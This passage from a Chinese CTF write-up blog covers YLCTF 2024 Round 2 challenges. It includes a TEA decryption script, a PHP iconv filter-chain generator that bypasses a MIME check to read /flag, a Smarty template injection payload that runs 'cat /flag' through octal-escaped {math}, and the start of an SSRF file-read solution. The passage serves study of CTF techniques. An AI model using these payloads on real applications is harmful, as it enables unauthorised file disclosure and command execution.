class="hljs-number">289739961</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>        v1 -= (((v0 &gt;&gt; <span class="hljs-number">5</span>) ^ (<span class="hljs-number">16</span> * v0)) + v0) ^ (k[(<span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>] + <span class="hljs-built_in">sum</span>)<br>        v1 &amp;= <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-built_in">sum</span> -= delta<br>        <span class="hljs-built_in">sum</span> &amp;= <span class="hljs-number">0xffffffff</span><br>        v0 -= (((v1 &gt;&gt; <span class="hljs-number">3</span>) ^ (<span class="hljs-number">4</span> * v1)) + v1) ^ (k[<span class="hljs-built_in">sum</span> &amp; <span class="hljs-number">3</span>] + <span class="hljs-built_in">sum</span>)<br>        v0 &amp;= <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> [v0, v1]<br><br><span class="hljs-comment"># 目标密文</span><br>target_v0 = <span class="hljs-number">1913208188</span><br>target_v1 = -<span class="hljs-number">1240730499</span> &amp; <span class="hljs-number">0xffffffff</span>  <span class="hljs-comment"># 转换为无符号整数</span><br><br><span class="hljs-comment"># 密钥</span><br>key = [<span class="hljs-number">4097</span>, <span class="hljs-number">8194</span>, <span class="hljs-number">12291</span>, <span class="hljs-number">16388</span>]<br><br><span class="hljs-comment"># 解密</span><br>decrypted = decipher([target_v0, target_v1], key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;解密结果: <span class="hljs-subst">&#123;decrypted&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;输入的两个标签应该是: <span class="hljs-subst">&#123;decrypted[<span class="hljs-number">0</span>]&#125;</span> 和 <span class="hljs-subst">&#123;decrypted[<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
<h5 id="round-2-ezwasm"><a class="markdownIt-Anchor" href="#round-2-ezwasm"></a> [Round 2] ezwasm</h5>
<p><img src="/../../images/ylctf/2024/wasm.png" srcset="/img/loading.gif" lazyload alt="wasm"></p>
<p>外部改成大写即可</p>
<h4 id="web-2"><a class="markdownIt-Anchor" href="#web-2"></a> Web</h4>
<h5 id="round-2-cmnts"><a class="markdownIt-Anchor" href="#round-2-cmnts"></a> [Round 2] Cmnts</h5>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Z2V0X3RoMXNfZjFhZy5waHA=  #get<span class="hljs-emphasis">_th1s_</span>f1ag.php<br></code></pre></td></tr></table></figure>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?key=a7a795a8efb7c30151031c2cb700ddd9<br></code></pre></td></tr></table></figure>
<p>变量覆盖</p>
<h5 id="round-2-pseudo复现"><a class="markdownIt-Anchor" href="#round-2-pseudo复现"></a> [Round 2] Pseudo(复现)</h5>
<p>可以看到给的附件里面的下载的php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">tmpfile</span>();<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-title function_ invoke__">fflush</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">mime_content_type</span>(<span class="hljs-title function_ invoke__">stream_get_meta_data</span>(<span class="hljs-variable">$file</span>)[<span class="hljs-string">&#x27;uri&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>,[<span class="hljs-string">&#x27;image/jpg&#x27;</span>,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>, <span class="hljs-string">&#x27;image/png&#x27;</span>, <span class="hljs-string">&#x27;image/gif&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error!!!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Description: File Transfer&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;download.jpg&quot;&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Expires: 0&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Cache-Control: must-revalidate&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Pragma: public&#x27;</span>);<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>可以利用这里的函数漏洞得到flag，关键点是需要绕过<code>mime_content_type</code>函数，可以利用filterchain进行绕过得到flag</p>
<p>下面是脚本，或者用GitHub上面的脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$base64_payload</span> = <span class="hljs-string">&quot;R0lGODlB&quot;</span>; <span class="hljs-comment">/*GIF89A*/</span><br><span class="hljs-variable">$conversions</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;/&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;0&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;2&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,<br>    <span class="hljs-string">&#x27;3&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;4&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;5&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#x27;</span>,<br>	<span class="hljs-string">&#x27;6&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;7&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;8&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;9&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;A&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;B&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;C&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,<br>    <span class="hljs-string">&#x27;D&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;E&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,<br>    <span class="hljs-string">&#x27;F&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;G&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,<br>    <span class="hljs-string">&#x27;H&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;I&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;J&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;K&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;L&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,<br>    <span class="hljs-string">&#x27;M&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,<br>    <span class="hljs-string">&#x27;N&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;O&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,<br>    <span class="hljs-string">&#x27;P&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;Q&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;R&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,<br>	<span class="hljs-string">&#x27;S&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,<br>    <span class="hljs-string">&#x27;T&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,<br>    <span class="hljs-string">&#x27;U&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,<br>    <span class="hljs-string">&#x27;V&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;W&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,<br>    <span class="hljs-string">&#x27;X&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;Y&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,<br>	<span class="hljs-string">&#x27;Z&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;d&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;e&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,<br>    <span class="hljs-string">&#x27;f&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,<br>    <span class="hljs-string">&#x27;h&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;i&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,<br>	<span class="hljs-string">&#x27;j&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;k&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;l&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;m&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,<br>    <span class="hljs-string">&#x27;n&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;o&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;p&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;q&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;r&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,<br>    <span class="hljs-string">&#x27;s&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,<br>    <span class="hljs-string">&#x27;t&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,<br>    <span class="hljs-string">&#x27;u&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;v&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;w&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;x&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,<br>    <span class="hljs-string">&#x27;y&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,<br>    <span class="hljs-string">&#x27;z&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,<br>);<br><br><span class="hljs-variable">$filters</span> = <span class="hljs-string">&quot;convert.base64-encode|&quot;</span>;<br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$base64_payload</span>)) <span class="hljs-keyword">as</span> <span class="hljs-variable">$c</span>) &#123;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-variable">$conversions</span>[<span class="hljs-variable">$c</span>] . <span class="hljs-string">&quot;|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-decode|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-encode|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-decode&quot;</span>;<br><br><span class="hljs-variable">$final_payload</span> = <span class="hljs-string">&quot;php://filter/<span class="hljs-subst">&#123;$filters&#125;</span>/resource=/flag&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$final_payload</span>;<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/ylctf/2024/pseudo.png" srcset="/img/loading.gif" lazyload alt="pseudo"></p>
<h5 id="round-2-phupe复现"><a class="markdownIt-Anchor" href="#round-2-phupe复现"></a> [Round 2] PHUPE(复现)</h5>
<p>这题写的时候的思路就是尝试文件上传进行smarty的模板注入，但是没有成功。</p>
<h6 id="0x01"><a class="markdownIt-Anchor" href="#0x01"></a> 0x01</h6>
<p>TPL是Smarty模板引擎使用的模板文件格式，它允许将PHP逻辑代码与HTML展示代码分离,使用特殊的标签语法 {标签} 来实现动态内容。</p>
<p>smarty 可以使用 math + 8进制进行绕过</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;extends file=&#x27;views/layout.tpl&#x27;&#125;<br>&#123;block name=content&#125;<br>    &lt;h1&gt;CTF File Reader&lt;/h1&gt;<br>    &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;<br>        &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;<br>        &lt;button type=&quot;submit&quot;&gt;Upload&lt;/button&gt;<br>    &lt;/form&gt;<br>    &lt;pre&gt;&#123;$file_content&#125;&lt;/pre&gt;<br>&#123;math equation=&quot;(\&quot;\\163\\171\\163\\164\\145\\155\&quot;)(\&quot;\\143\\141\\164\\40\\57\\146\\154\\141\\147\&quot;)&quot;&#125;<br>&#123;/block&#125;<br></code></pre></td></tr></table></figure>
<p>~~跟着复现没有成功,感觉可能中间跳步骤了。~~时隔一周回来填坑，确实是自己的问题，没有好好研究给的附件，需要在对应的文件上进行文件的覆盖</p>
<p><img src="/../../images/ylctf/2024/phu.png" srcset="/img/loading.gif" lazyload alt="phu"></p>
<p>然后就有flag了</p>
<h6 id="0x02"><a class="markdownIt-Anchor" href="#0x02"></a> 0x02</h6>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/103784">从0CTF一道题看move_uploaded_file的一个细节问题</a>,参考链接</p>
<h5 id="round-2-redfox复现"><a class="markdownIt-Anchor" href="#round-2-redfox复现"></a> [Round 2] RedFox(复现)</h5>
<p>先注册一个账号进行登陆</p>
<p>有一个上传评论的地方，发现可以有ssrf的漏洞(当时其实想到这层了，没注意回显包)</p>
<p><img src="/../../images/ylctf/2024/redfox1.png" srcset="/img/loading.gif" lazyload alt="redfox1"></p>
<p><img src="/../../images/ylctf/2024/redfox2.png" srcset="/img/loading.gif" lazyload alt="redfox2"></p>
<p>然后测试一下/flag有无发现没有，</p>
<p>/uploads/profile_0f1726ba83325848d47e216b29d5ab99.jpg，<s>后面我也没找到本地文件，先到这吧。</s>,继续来填坑。</p>
<p>不能直接读到flag，尝试读<code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;Database.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;User.php&#x27;</span>;<br><span 